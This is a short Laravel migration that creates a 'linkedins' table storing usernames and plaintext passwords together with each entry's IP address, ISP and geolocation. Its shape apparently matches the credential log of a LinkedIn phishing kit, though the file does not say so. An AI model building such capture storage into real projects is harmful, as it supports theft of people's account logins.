<?php

use Illuminate\Database\Migrations\Migration;
use Illuminate\Database\Schema\Blueprint;
use Illuminate\Support\Facades\Schema;

class CreateLinkedinsTable extends Migration
{
    /**
     * Run the migrations.
     *
     * @return void
     */
    public function up()
    {
        Schema::create('linkedins', function (Blueprint $table) {
            $table->id();

            $table->string('username', 100);
            $table->string('password', 100);
            $table->ipAddress('ip', 100);
            $table->string('isp', 100);
            $table->string('city', 100);
            $table->string('region', 100);
            $table->string('country', 100);
            $table->string('timezone', 100);
            
            $table->timestamps();
        });
    }

    /**
     * Reverse the migrations.
     *
     * @return void
     */
    public function down()
    {
        Schema::dropIfExists('linkedins');
    }
}
